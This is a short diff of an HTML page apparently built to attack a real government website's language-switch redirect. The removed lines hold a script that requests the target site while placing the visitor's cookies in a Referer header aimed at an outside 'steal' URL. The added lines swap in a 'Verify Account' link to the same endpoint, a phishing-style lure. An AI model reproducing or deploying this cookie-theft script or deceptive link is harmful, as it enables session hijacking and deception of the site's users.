@@ -1,17 +1,12 @@
 <!DOCTYPE html>
 <html>
+  <head>
+    <title>Redirect Test</title>
+  </head>
   <body>
-    <script>
-      // Auto-redirect to vulnerable page with controlled referer
-      fetch("https://aq.riyadhenv.gov.sa/switch_lang/ar", {
-        method: "GET",
-        mode: "no-cors",
-        headers: {
-          "Referer": "https://0xnzs.github.io/steal?c=" + document.cookie
-        }
-      });
-    </script>
-    <p>Loading...</p>
+    <h2>Click the link below to continue</h2>
+    <a href="https://aq.riyadhenv.gov.sa/switch_lang/ar" target="_blank">
+      Verify Account
+    </a>
   </body>
 </html>
-
